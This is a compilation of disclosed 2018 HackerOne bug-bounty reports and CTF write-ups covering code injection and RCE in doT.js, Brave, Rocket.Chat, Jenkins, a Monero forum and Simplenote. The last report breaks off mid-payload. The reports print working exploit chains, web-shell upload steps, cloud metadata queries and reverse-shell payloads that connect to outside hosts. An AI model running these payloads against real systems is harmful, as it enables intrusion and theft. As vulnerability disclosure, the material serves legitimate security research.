## Module Description

Created in search of the fastest and concise JavaScript templating function with emphasis on performance under V8 and nodejs. It shows great performance for both nodejs and browsers.

doT.js is fast, small and has no dependencies.

## Module Stats

76,838 downloads in the last week

# Vulnerability

## Vulnerability Description

dot uses Function() to compile templates. this can be exploited by the attacker if she can control the template or if she can control the value set on Object.prototype.

## Steps To Reproduce:

a) The basic attack vector
```js
var doT = require("dot");
var tempFn = doT.template("<h1>Here is a sample template " +
    "{{=console.log(23)}}</h1>");
tempFn({})
```
b) in combination with a prototype pollution attack
 - create a folder "resources" and inside that a file called "mytemplate.dot" with the following content:
```html
<h1>Here is a sample template</h1>
```
- in the folder containing the resources folder, create and execute the following js file
```js
var doT = require("dot");
// prototype pollution attack vector
Object.prototype.templateSettings = {varname:"a,b,c,d,x=console.log(25)"};
// benign looking template compilation + application
var dots = require("dot").process({path: "./resources"});
dots.mytemplate();
```

Even though the template compilation + application looks safe, due to the prototype pollution, the attacker can execute arbitrary commands.

## Patch

N/A remove Function() call

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

The attacker can achieve code injection/RCE if she can control the template or if she can set arbitrary properties on Object.prototype. Using Function() with runtime computed values is rarely safe.

---

### [chrome://brave navigation from web](https://hackerone.com/reports/415967)

- **Report ID:** `415967`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** Brave Software
- **Reporter:** @qab
- **Bounty:** 650 usd
- **Disclosed:** 2018-10-23T19:13:25.251Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

It's possible to navigate to the infamous 'chrome://brave' (and all other) privileged page from web, requiring only a single click. This is possible by opening popups with the 'noopener' attribute.

## Products affected: 

 
Brave: 0.24.0 
V8: 6.9.427.23 
rev: f657f15bf7e0e0c50a2b854c6b05edb59bfc556c 
Muon: 8.1.6 
OS Release: 10.0.17134 
Update Channel: Release 
OS Architecture: x64 
OS Platform: Microsoft Windows 
Node.js: 7.9.0 
Brave Sync: v1.4.2 
libchromiumcontent: 69.0.3497.100

## Steps To Reproduce:

1. Host attached PoC from web
2. Click button

## Impact

This is a direct violation of SOP, we can open any URL of which chrome://brave is the worst as it could lead to RCE.

---

### [chrome://brave can still be navigated to, leading to RCE](https://hackerone.com/reports/415178)

- **Report ID:** `415178`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Brave Software
- **Reporter:** @qab
- **Bounty:** 300 usd
- **Disclosed:** 2018-10-23T19:12:42.279Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

'chrome://brave'  can be navigated to using the middle mouse click (or normal click with CTRL held) IFF coming from a bookmark. I am also using a small bug to actually trick a user into bookmarking our crafted URL through drag and drop.

## Products affected: 
Brave: 0.24.0 
V8: 6.9.427.23 
rev: f657f15bf7e0e0c50a2b854c6b05edb59bfc556c 
Muon: 8.1.6 
OS Release: 10.0.17134 
Update Channel: Release 
OS Architecture: x64 
OS Platform: Microsoft Windows 
Node.js: 7.9.0 
Brave Sync: v1.4.2 
libchromiumcontent: 69.0.3497.100

## Steps To Reproduce:

1. Host attached PoC in any web
2. Once opened, you will be instructed to save the html file locally and open it this way
3. Open the saved PoC from local disk
4. Click anywhere to open a popup
5. Drag the anchor tag into the main window bookmark bar (if you never bookmarked anything then just right click and bookmark)
6. Hold CTRL and click on the new bookmark, or right click and press "open in new tab"

## Impact

Navigating to chrome://brave is a bad thing since it can lead to RCE ( https://hackerone.com/reports/395737 )
 
We can also use another bug I filed ( https://hackerone.com/reports/415167 ) which can detect local files. If there is a way to drop HTML files into the local disk (cache or some other possibility) we can then try to use bug 415167 to bypass having to know OS username and any potentially salted folders. If this is achievable we can skip the part where we need to download and open PoC locally. 

It would go something like:

1. Open PoC from web
2. PoC will somehow drop HTML in local disk (I have heard in other reports of possible local file XSS)
3. Using bug 415167 we try to guess OS username + folder path to dropped HTML file
4. Use the bookmark trick as described above.
5. Instruct user to open bookmark with either method described above.

---

### [Solution for h15411's CTF challenge](https://hackerone.com/reports/415222)

- **Report ID:** `415222`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** h1-5411-CTF
- **Reporter:** @herrera
- **Bounty:** - usd
- **Disclosed:** 2018-10-22T16:26:40.190Z
- **CVE(s):** -

**Vulnerability Information:**

## Baby steps
Earlier today a friend tipped me off about an ongoing CTF challenge that was being run by HackerOne and would get the first ten winners a ticket to participate in #h15411, which will be a live-hacking event happening in Buenos Aires.

This immediately caught my attention and I decided to take a look to see how far I could get.

The first step was decoding the QR code that was in the tweet announcing the challenge (https://twitter.com/Hacker0x01/status/1044974142150373378) and then decoding the hexadecimal value obtained, which in turn gave me the URL of the challenge.

## Game on!

After accessing https://h1-5411.h1ctf.com, it's possible to notice that this application lets you generate memes from six templates which are divided into two different types. Three of which are of the type image and the other three, of type text. The template hidden input also caught my attention, which was apparently being used to load these templates from different files.

This was screaming "PATH TRAVERSAL! LFI!" which was indeed the first way I tried to tackle the challenge (type = image, template=../../../../../../etc/passwd) and needlessly to say I was rick rolled :´(

Shortly after, I tried to change the type to "text" instead of using the type "image" and it worked! I now had the ability to read local files from the server, a vulnerability known as LFI, short for Local File Inclusion.

After downloading all the files from /var/www/html/ I started to analyze the code by first looking into /api/import_memes_2.0.php (because I noticed that in its code it utilized unserialize, which, in the past, has been the source of many vulnerabilities in all sorts of web applications).

I quickly realized that it was possible to upload a file containing serialized code encoded in base64 through import_memes_2.0.php and that it would be saved in the session. Also, looking into /includes/classes.php, there was a class named ConfigFile that had the magic function __toString() which called $this->parse() and then finally tried to load XML from a string that it got from its constructor. This is perfect for an Object Injection attack, which by leveraging the magic method __toString() will allow me to control the value passed to the constructor of the ConfigFile class and then perform a XML External Entity attack when the parse() method is called.

## Coding time

The next step was to create a small php program to generate valid serialized code using a placeholder as the payload.

```
<?php
	require_once("../includes/config.php");

	$config = new ConfigFile("data:text/html,placeholder");
	$payload = serialize([$config]);

	// a:1:{i:0;O:10:"ConfigFile":1:{s:10:"config_raw";s:11:"placeholder";}}
	echo $payload;
?>
```
Then, using python, I created another program that takes a URL as the argument and creates a valid file ready to be uploaded to exploit the XXE vulnerability in the application.

After all my attempts to get RCE using the XXE vulnerability failed, my next big bet was in a SSRF attack. I finished coding the program below and then it was a matter of time to scan the internal network and find the local server running in the port 1337.

```
import base64, sys

url = sys.argv[1]

xml = """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE xxx [ <!ELEMENT xxx ANY >
<!ENTITY payload SYSTEM "php://filter/read=convert.base64-encode/resource=""" + url + """" >]>
<test>
    <toptext>&payload;</toptext>
</test>""";

xml_length = len(xml);

start = 'a:1:{i:0;O:10:"ConfigFile":1:{s:10:"config_raw";s:' + str(xml_length) + ':"'
end   = '";}}'

all = start+xml+end
encoded = base64.b64encode(all)

f = open("payload.memepak", "w")
f.write(encoded)
```

## Reading is fundamental

By reading the documentation API I was able to discover that setting the debug parameter to one would activate the debug mode.

Then, still following the documentation, I made  a request to http://127.0.0.1:1337/status?debug=1 and it returned base64 encoded debug information, that when decoded looked like a pickle object. Shortly after, I made a request to http://127.0.0.1:1337/update-status?debug=1 which said that the status parameter was missing. I sent the request again, but now with the missing status parameter and the response was that it contained an incorrect padding. This got me thinking and then I sent a new request to http://127.0.0.1:1337/update-status?debug=1&status=MSsx (MSsx being 1+1 encoded in base64) and it returned a new debug message about not being able to find MARK.

A quick search in Google and I confirmed my suspicion that this indeed was related to a Pickle Object Serialization vulnerability. Using the template published by mgeeky (https://gist.github.com/mgeeky/cbc7017986b2ec3e247aab0b01a9edcd), I was able to create a payload that would exploit the vulnerability and force the challenge's server to establish a reverse shell with my server.

```
import cPickle
import sys
import base64

COMMAND = "nc -e /bin/sh 111.111.111.11 1337"

class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(COMMAND,))

print base64.b64encode(cPickle.dumps(PickleRce()))
```
## Last words
Finally, after getting a shell, I executed `ls` and  `cat flag.txt` and got the flag:
**flag{cha1n1ng_bugs_f0r_fun_4nd_pr0f1t?_or_rep0rt_an_LF1}**

Thanks for the challenge and for reading! I had a lot of fun solving it.

## Impact

The attacker could achieve remote code execution which would allow him to get the flag that will get him invited to the #h15411 :)

---

### [RCE via Local File Read -> php unserialization-> XXE -> unpickling](https://hackerone.com/reports/415501)

- **Report ID:** `415501`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** h1-5411-CTF
- **Reporter:** @iamnoooob
- **Bounty:** - usd
- **Disclosed:** 2018-10-22T16:01:36.514Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** 
It was possible to escalate to Remote Code Execution via different bugs such as local file read, php object injection, XML External Entity and Un-Pickling of Python serialized object.
 
**Description:** 
Using local file read it was discovered that the php code was vulnerable to php object injection and a class could be used to cause XXE which inturn helped to access internal service running on the machine using SSRF(via XXE) on port 1337  which on further investigation was vulnerable to unpickling and thus lead to remote code execution by creating a crafted searlized Pickle.

## Steps To Reproduce:
The Road to flag had the following Chain of bugs required: 
1.LFR
2.PHP Object Injection
3.XXE
4.Python Pickle De-Serialization
5.Flag

##1.LFR
while generating memes on https://h1-5411.h1ctf.com/generate.php# It was found that the request to generate a meme from text templates allowed to include arbitrary files and save it to a randomly generated file to a fixed path. The template parameter of this request suffered from Local File Read.

Request:

~~~
POST /api/generate.php HTTP/1.1
Host: h1-5411.h1ctf.com
Connection: close
Content-Length: 72
Accept: */*
Origin: https://h1-5411.h1ctf.com
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: https://h1-5411.h1ctf.com/generate.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,de;q=0.8
Cookie: PHPSESSID=

template=../../../../../../../etc/passwd&type=text&top-text=ad&bottom-text=asd
~~~

Response:

~~~
{
  "meme_path": "../data/memes/1538093153-756c689bcd82668cd3114792ed5befefc1d489cb0c96ea6b7d13051329c0d918.txt"
}
~~~

Upon visiting the /data/memes/1538093153-756c689bcd82668cd3114792ed5befefc1d489cb0c96ea6b7d13051329c0d918.txt the contents of /etc/passwd could be seen.

{F352169}

With the help of this local file read, we were able to read the content of server side php files.
After analyzing the config.php we came to know about various different files like includes/header.php,includes/classes.php etc the source of header.php gave us further two new php files /api/export_memes_2.0.php and /api/import_memes_2.0.php. 

On auditing includes/classes.php we found that function parse() was vulnerable to XXE however the function resides in a class (ConfigFile) which is not getting initiated in any of the file we audited.

Reading the source code of /api/{export,import}_memes_2.0.php files showed the usage of php unserialization (vulnerable) during import via userinput in a $_FILES['f'] parameter which was further stored in $_SESSION['memes'] as an array and serialization during export.

##2. PHP Object Injection & 3. XXE

The ConfigFile Class had a magic method __toString() which is called whenever the object of ConfigFile Class is echo'ed or used a string. That __toString() method also calls the parser() function which is vulnerable to XXE. the Parser function takes a property "config_raw" which is an XML string to be parsed. Now all we have to discover is some place where that object is echo'd or used a string such as concatenation etc., it was found that /memes.php had a for loop which would just simply loop over $_SESSION['memes'] and echo each value in the array. so If we get our object to be placed in $_SESSION['memes'] it will be echoed and __toString() magic method will be invoked calling out parser() function which is further vulnerable to XXE and will help to access internally running services using SSRF.

{F352171}

Using the Unserialize() call in import_memes_2.0.php we were able to craft payload leading to XXE(SSRF). We made a quick php script for generating it easily 

~~~
<?php
//ex- usage php exploit.php http://localhost
class ConfigFile{

    function __construct($url) {
      $this->config_raw = file_get_contents($url);
    }

    function parse() {
     echo "i was called";  
$dom = new DOMDocument();
      $dom->  ($this->config_raw, LIBXML_NOENT | LIBXML_DTDLOAD);
      $o = simplexml_import_dom($dom);
should we
      $this->top_text = $o->toptext;
      $this->bottom_text = $o->bottomtext;
      $this->template = $o->template;
      $this->type = $o->type;
  }

    function __toString() {
        $this->parse();
        echo $this->template;
        return "I am a stirng";
}
}
$obj=new ConfigFile('<root></root>');
$obj->config_raw='<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "'.$argv[1].'" >]><note><toptext>Tove</toptext><bottomtext>Jani</bottomtext><type>Reminder</type><template>&xxe;</template></note>';
$arr=[$obj];
echo base64_encode(serialize($arr));
echo "\n";
~~~

Just copy the payload and use it in the following request

~~~
POST /api/import_memes_2.0.php HTTP/1.1
Host: h1-5411.h1ctf.com
Connection: close
Content-Length: 610
Cache-Control: max-age=0
Origin: https://h1-5411.h1ctf.com
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryi9X2MAeAOhvJm616
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: https://h1-5411.h1ctf.com/import_memes_2.0.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,de;q=0.8
Cookie: PHPSESSID=78cvqcb3qbphjc2rkdo9r5tbug

------WebKitFormBoundaryi9X2MAeAOhvJm616
Content-Disposition: form-data; name="f"; filename="1538079414_export.memepak"
Content-Type: application/octet-stream

YToxOntpOjA7TzoxMDoiQ29uZmlnRmlsZSI6MTp7czoxMDoiY29uZmlnX3JhdyI7czoyMzk6Ijw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVURi04Ij8+IDwhRE9DVFlQRSBmb28gWzwhRUxFTUVOVCBmb28gQU5ZID48IUVOVElUWSB4eGUgU1lTVEVNICJodHRwOi8vbG9jYWxob3N0OjEzMzcvc3RhdHVzIiA+XT48bm90ZT48dG9wdGV4dD5Ub3ZlPC90b3B0ZXh0Pjxib3R0b210ZXh0Pkphbmk8L2JvdHRvbXRleHQ+PHR5cGU+UmVtaW5kZXI8L3R5cGU+PHRlbXBsYXRlPiZ4eGU7PC90ZW1wbGF0ZT48L25vdGU+Ijt9fQ==
------WebKitFormBoundaryi9X2MAeAOhvJm616--


~~~

where the request is base64 encoded version of this serialized object 

~~~
a:1:{i:0;O:10:"ConfigFile":1:{s:10:"config_raw";s:239:"<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://localhost:1337/" >]><note><toptext>Tove</toptext><bottomtext>Jani</bottomtext><type>Reminder</type><template>&xxe;</template></note>";}}
~~~

To view the results of the XXE visit /memes.php where the object is echo'ed calling the __toString() magic method.

{F352167}

##3 Un-Pickling  
It was discovered that 1337 port on localhost was running a maintenance api which had 2 endpoints /status and /update-status and a debug parameter which on requesting gives some information about the request such as debug & status parameter. It was found that update-status also takes a 'status' parameter to change the maintenance mode from off to on or vice versa. Request to this endpoint along with 'debug=1' parameter set gives a base64 encoded string which on decoding seemed to be a Python Pickle Serialized Object. Next we just used the following code snippet to create a base64 encoded pickle object which executes a reverse shell to our VPS

~~~
import cPickle
import sys
import base64

DEFAULT_COMMAND = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"rce.ee\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND

class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(COMMAND,))

print base64.b64encode(cPickle.dumps(PickleRce()))
~~~

we listened for a netcat session on our server and the final request was sent:

~~~
POST /api/import_memes_2.0.php HTTP/1.1
Host: h1-5411.h1ctf.com
Connection: close
Content-Length: 1094
Cache-Control: max-age=0
Origin: https://h1-5411.h1ctf.com
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryi9X2MAeAOhvJm616
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: https://h1-5411.h1ctf.com/import_memes_2.0.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,de;q=0.8
Cookie: PHPSESSID=78cvqcb3qbphjc2rkdo9r5tbug

------WebKitFormBoundaryi9X2MAeAOhvJm616
Content-Disposition: form-data; name="f"; filename="1538079414_export.memepak"
Content-Type: application/octet-stream

YToxOntpOjA7TzoxMDoiQ29uZmlnRmlsZSI6MTp7czoxMDoiY29uZmlnX3JhdyI7czo2MDI6Ijw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVURi04Ij8+IDwhRE9DVFlQRSBmb28gWzwhRUxFTUVOVCBmb28gQU5ZID48IUVOVElUWSB4eGUgU1lTVEVNICJodHRwOi8vbG9jYWxob3N0OjEzMzcvdXBkYXRlLXN0YXR1cz9zdGF0dXM9WTNCdmMybDRDbk41YzNSbGJRcHdNUW9vVXlkd2VYUm9iMjRnTFdNZ1hDZHBiWEJ2Y25RZ2MyOWphMlYwTEhOMVluQnliMk5sYzNNc2IzTTdjejF6YjJOclpYUXVjMjlqYTJWMEtITnZZMnRsZEM1QlJsOUpUa1ZVTEhOdlkydGxkQzVUVDBOTFgxTlVVa1ZCVFNrN2N5NWpiMjV1WldOMEtDZ2ljbU5sTG1WbElpdzBORE1wS1R0dmN5NWtkWEF5S0hNdVptbHNaVzV2S0Nrc01DazdJRzl6TG1SMWNESW9jeTVtYVd4bGJtOG9LU3d4S1RzZ2IzTXVaSFZ3TWloekxtWnBiR1Z1YnlncExESXBPM0E5YzNWaWNISnZZMlZ6Y3k1allXeHNLRnNpTDJKcGJpOXphQ0lzSWkxcElsMHBPMXduSndwd01ncDBVbkF6Q2k0PSZkZWJ1Zz0xIiA+XT48bm90ZT48dG9wdGV4dD5Ub3ZlPC90b3B0ZXh0Pjxib3R0b210ZXh0Pkphbmk8L2JvdHRvbXRleHQ+PHR5cGU+UmVtaW5kZXI8L3R5cGU+PHRlbXBsYXRlPiZ4eGU7PC90ZW1wbGF0ZT48L25vdGU+Ijt9fQ==
------WebKitFormBoundaryi9X2MAeAOhvJm616--
~~~

which decodes to 

~~~
a:1:{i:0;O:10:"ConfigFile":1:{s:10:"config_raw";s:602:"<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://localhost:1337/update-status?status=Y3Bvc2l4CnN5c3RlbQpwMQooUydweXRob24gLWMgXCdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgicmNlLmVlIiw0NDMpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pO1wnJwpwMgp0UnAzCi4=&debug=1" >]><note><toptext>Tove</toptext><bottomtext>Jani</bottomtext><type>Reminder</type><template>&xxe;</template></note>";}}
~~~

And we got a reverse shell and in the same directory (/app) we found flag.txt which said :) 

~~~
Yay! Here is your flag:


flag{cha1n1ng_bugs_f0r_fun_4nd_pr0f1t?_or_rep0rt_an_LF1}


Go to https://hackerone.com/h1-5411-ctf and submit your writeup! 

~~~

{F352164}

##Regards 
Rahul Maini & Harsh Jaiswal (@bugdiscloseguys)

## Impact

RCE

---

### [Remote Code Execution in Rocket.Chat Desktop](https://hackerone.com/reports/276031)

- **Report ID:** `276031`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Rocket.Chat
- **Reporter:** @mattaustin
- **Bounty:** - usd
- **Disclosed:** 2018-09-18T22:00:43.878Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** The Markdown parser can be tricked into allowing arbitrary Javascript leading to "remote code execution". 

**Description:** 
By combining the "link" and inline code block we can trick the parser into breaking out of the current HTML attribute. 

This allows us to control other attributes of the tag and trigger javascript events. 
```
[ hax ](http://hax//onmouseover=location='https://maustin.net/hax/rocket/hack.html';"`hax`zzz)
```
becomes 
```html
<a href="&lt;a href=" http:="" hax="" onmouseover="location='https://maustin.net/hax/rocket/hack.html';&quot;&quot;" target="_blank" rel="noopener noreferrer">
```

This is a simple redirect to: https://maustin.net/hax/rocket/hack.html

From this point the goal is to get the application to call shell.openExternal(href); with a URL we control. Thats because: 
>      "open 'file://localhost/Volumes/Macintosh HD/foo.txt'" opens the document
     in the default application for its type (as determined by LaunchSer-
     vices).

Note:  For this demo I point to file:///Applications/Calculator.app however if you point to a public NFS or SMB server on windows this executable can be controlled by the attacker. (example at: file:///net/192.241.239.91/var/nfs/general/hack2.app)

In https://github.com/RocketChat/Rocket.Chat.Electron/blob/master/src/public/preload.js#L45 all links are hooked and some patter matching is used to check before firing them off to shell.openExternal(href); 

Normally preload javascript is an "isolated scope" in this case however the code is directly attached to the user controlled DOM as the "window.onload" handler. This means we can overload some global objects and methods including the RegExp.prototype.test method. Now we can bypass the file:\\/\\/ check send our application path to openExternal.

```html
<!DOCTYPE html>
<html>
    <head>
      <script>
        RegExp.prototype.test = new Proxy(RegExp.prototype.test, {
          apply: function(target, thisArg, argumentsList) {
            console.log(thisArg.source);
          console.log(argumentsList[0]);
          if((thisArg.source == '^file:\\/\\/.+') && (argumentsList[0] === 'file:///Applications/Calculator.app')){
            return false;
          }
          return Reflect.apply(target, thisArg, argumentsList)
          }
        });
        setTimeout(()=>{
            a = document.createElement("A")
            a.href="file:///Applications/Calculator.app"
            document.body.appendChild(a)
            a.click()
        }, 3000);
      </script>
    </head>
    <body>
     <h1>3...2...1...🚀</h1>
    </body>
</html>
```

## Releases Affected:

  * >= 2.9.0

## Steps To Reproduce (from initial installation to vulnerability):

  1. Create a new channel to test in. 
  1. Send the following snippet of markdown: 
```
[ hax ](http://hax//onmouseover=location='https://maustin.net/hax/rocket/hack.html';"`hax`zzz)
```
  1. Move your mouse over the link you just send and 

## Supporting Material/References:

  * https://youtu.be/HPlwlc2J-LQ

## Suggested mitigation

  * The markdown parser needs a little love to prevent the initial xss. 
  * I believe you should be able to use something like  `window.addEventListener("load",` .. to execute the checks in the proper scope.

---

### [Public Jenkins instance with /script enabled](https://hackerone.com/reports/403402)

- **Report ID:** `403402`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** Ubiquiti Inc.
- **Reporter:** @smiegles
- **Bounty:** - usd
- **Disclosed:** 2018-09-10T16:21:17.097Z
- **CVE(s):** -

**Vulnerability Information:**

Hi,

First of all. I'm not 100% able to verify that this server is actually owned by Ubnt as there are multiple DNS Name's in the SSL certificate.

```
DNS Name: *.uum.com
DNS Name: *.ubnt.com
DNS Name: *.svc.ubnt.com
DNS Name: *.api.uum.com
DNS Name: *.svc.uum.com
DNS Name: uum.com
```

So, the server hosted on https://54.191.232.223/and https://54.186.253.37/is reachable from the internet and has the scirpt console enabled.

You can execute code on it by going to: https://54.186.253.37/script and insert the following code:

```
"ls /".execute().text
```

__result__
````
Result: bin
boot
dev
docker-java-home
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

It also allows reaching the AWS metadata server:

```
"curl http://169.254.169.254/latest/meta-data/".execute().text
```

__Result__

```
ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
hostname
iam/
instance-action
instance-id
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
public-keys/
reservation-id
security-groups
services/
```

## Impact

RCE

{F340446}
{F340447}

**Summary (researcher):**

Ubiquiti exposed a Jenkins server on the internet without any authentication, this allowed me to reach the AWS metadata service and execute code on the server itself. They resolved the issue and rewarded a bounty within 30 minutes of reporting, really impressive.

---

### [forum.getmonero.org Shell upload](https://hackerone.com/reports/357858)

- **Report ID:** `357858`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Monero
- **Reporter:** @kaulse
- **Bounty:** - usd
- **Disclosed:** 2018-07-27T11:54:11.453Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** 
The method uploadProfile in the UsersController allows an attacker to upload a shell to the target server due to lack of image validation.

**Description:**

## Steps To Reproduce:
  1. Open POC https://forum.getmonero.org/uploads/profile/lNobodyl1527340454.php or https://forum.getmonero.org/uploads/profile/lNobodyl1527341021.php
Or just follow these steps:
1. Find a nice picture and embed the shell into the image like this `exiftool -documentname='<?php echo file_get_contents("/etc/passwd"); ?>' picture.png`
2. Rename the jpg/png picture to the `.php` extension.
3. Upload the picture.
4. You will get an 500 error page. Ignore it. Grep the time from the response and convert it to a timestamp.
5. Use the timestamp to find your shell: `https://forum.getmonero.org/uploads/profile/[USERNAMAE][timestamp].php`


## Gathered infos:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
bind:x:103:109::/var/cache/bind:/bin/false
ntpd:x:104:110::/var/run/openntpd:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
fluffypony:x:1000:1000:Fluffypony,,,:/home/fluffypony:/bin/bash
postfix:x:106:114::/var/spool/postfix:/bin/false
ossec:x:1001:1001::/var/lib/dome9/ossec:/bin/false
mysql:x:107:116:MySQL Server,,,:/var/lib/mysql:/bin/false
redis:x:108:118:redis server,,,:/var/lib/redis:/bin/false
pollinate:x:109:1::/var/cache/pollinate:/bin/false
gearman:x:110:119:Gearman Job Server,,,:/var/lib/gearman:/bin/false
memcache:x:111:120:Memcached,,,:/nonexistent:/bin/false
debian-tor:x:112:121::/var/lib/tor:/bin/false
systemd-timesync:x:113:123:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:114:124:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:115:125:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:116:126:systemd Bus Proxy,,,:/run/systemd:/bin/false
uuidd:x:100:101::/run/uuidd:/bin/false
_apt:x:117:65534::/nonexistent:/bin/false
blackfire:x:999:999::/dev/null:
colord:x:118:129:colord colour management daemon,,,:/var/lib/colord:/bin/false
oident:x:119:130::/:/bin/false
```

## Impact

A hacker can hack the server ^^.

---

### [RCE via Print function [Simplenote 1.1.3 - Desktop app] ](https://hackerone.com/reports/358049)

- **Report ID:** `358049`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Automattic
- **Reporter:** @luigigubello
- **Bounty:** - usd
- **Disclosed:** 2018-07-26T08:26:07.139Z
- **CVE(s):** -

**Vulnerability Information:**

In **Simplenote 1.1.3 - Desktop app** there is a stored XSS vulnerability that can be used to execute arbitrary code. If there is malicious code in the note and the user tries to print it (for example to save it as a PDF), the malicious code runs.

This report is based on the [report **#291539**](https://hackerone.com/reports/291539), by Yasin Soliman (ysx). I used his code to pass from XSS to RCE.

# Step to reproduce

## 1 - Prerequisites

- Download and install Simplenote 1.1.3 Desktop app (I use Debian, but I think the problem is present on all desktop versions)
- Markdown must **not** be enabled

## 2 - Stored XSS

Create a new note, and you write this text:
```
">'><details/open/ontoggle=confirm('XSS')>
```
Now go to **File** --> **Print**. An alert box appears, so there is a XSS vulnerability and the code runs when the user tries to print the note.

## 3 - From XSS to RCE

Thanks to [**ysx**] (https://hackerone.com/ysx), I used the code in his proof-of-concept.
The code to open the Gnome calculator in Debian is:

```
var Process = process.binding('process_wrap').Process;
var proc = new Process();
proc.onexit = function(a,b) {};
var env = process.env;
var env_ = [];
for (var key in env) env_.push(key+'='+env[key]);
proc.spawn({file:'/usr/bin/gnome-calculator',cwd:null,windowsVerbatimArguments:false,detached:false,envPairs:env_,stdio:[{type:'ignore'},{type:'ignore'},{type:'ignore'}]});
```

Now you use the functions `writeln()` and `String.fromCharCode()` to bypass possible filters. So you [encode] (https://www.martineve.com/2007/05/15/javascript-eval-string-fromcharcode-encoder) the script into unicode values. Now you can create the payload:

```
